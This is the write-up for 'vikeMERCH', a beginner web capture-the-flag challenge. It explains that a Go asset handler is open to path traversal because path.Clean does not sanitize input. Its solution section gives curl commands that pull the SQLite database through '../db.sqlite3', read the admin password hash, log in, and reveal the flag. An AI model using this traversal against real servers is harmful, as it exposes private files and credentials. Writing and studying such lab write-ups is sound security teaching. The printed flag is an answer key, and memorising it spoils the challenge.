# vikeMERCH

**Author: [`Malcolm Seyd`](https://github.com/malcolmseyd)**

**Category: `Web Easy`**

## Description

Welcome to vikeMERCH, your one stop shop for Viking-themed merchandise! We're still working on our website, but don't let that stop you from browsing our high-quality items. We just know you'll love the Viking sweater vest.

## Organizers

The flag must be input when running the container. Here's an example of what you'll want to run:

```console
$ docker run --rm -p 127.0.0.1:8080:8080/tcp -e FLAG='vikeCTF{testing}' -e GIN_MODE=release vikemerch
```

The admin password is randomly generated during the build step, so we shouldn't distribute a compiled image.

## Solution

The asset handler has a path-traversal vulnerability. The key takeaway from this challenge is that Go's `path.Clean` is **not safe for input sanitization**, which many users of the language find surprising.

We can use this knowledge to download the SQLite database and read the admin password.

```console
$ curl 'http://localhost:8080/assets?id=../db.sqlite3' > db.sqlite3
$ sqlite3 db.sqlite3 "SELECT password FROM user WHERE username = 'admin'"
43ae9e2b73539ba0f10fc059ce5d7c9d4944c28c4af086863a04594b8d0fbda1
$ curl 'http://localhost:8080/admin' -d 'username=admin&password=43ae9e2b73539ba0f10fc059ce5d7c9d4944c28c4af086863a04594b8d0fbda1'
vikeCTF{whY_w0ulD_g0_d0_th15}
```

## Flag

```
vikeCTF{whY_w0ulD_g0_d0_th15}
```
